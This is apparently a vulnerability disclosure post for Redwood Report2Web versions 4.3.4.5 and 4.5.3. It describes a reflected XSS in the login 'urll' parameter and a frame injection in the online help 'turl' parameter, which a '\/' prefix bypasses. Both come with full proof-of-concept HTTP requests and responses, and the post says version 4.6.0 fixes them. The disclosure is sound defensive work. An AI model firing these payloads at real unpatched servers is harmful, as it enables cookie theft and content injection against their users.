---
layout: post
title: Redwood Report2Web XSS and Frame injection
categories: cve
---

[Report2Web](https://www.redwood.com/report-distribution) v4.3.4.5 and v4.5.3 are vulnerable to XSS. v4.3.4.5 is also vulnerable to frame injection. Both issues are fixed in v4.6.0.

## Report2Web Login Panel XSS
The value of the `urll` parameter is getting reflected without an sanitization, allowing a remote attacker to inject javascript code to the victim's browser.

Request:
```
GET /r2w/singIn.do?urll=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1
Host: [HOST]
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en,en-US;q=0.7,de;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=F291E04B316ED2DF72623ACEA8D952CA; r2wctg=3
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```

Response:
```
...
<form name="form" action="signIn.do" method="post" onsubmit="return handleSubmit(this);">
 <input type="hidden" name="id" value="" />
 <input type="hidden" name="language" value="en" />
 <input type="hidden" name="urll" value=""><script>alert(1)</script>" />
 
<div class="outer">
...
```

## Report2Web Online Help Frame Injection
The `turl` parameter takes a local path as input and diplays it's content inside a frame, e.g. `?turl=/local/path/doc.html`. You can bypass the protection by using `\/hostname.tld` which the browser translates to `//hostname.tld` and then to `https://example.com`, loading a malicious website inside the frame, leading to vulnerabilities like content injection and XSS.

Request:
```
GET /r2w/help/Online_Help/NetHelp/default.htm?turl=\/example.com HTTP/1.1
Host: [HOST]
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en,en-US;q=0.7,de;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```

Response:
```
...
<frame id="right" name="right" title="Topic text" src="\/example.com">
...
```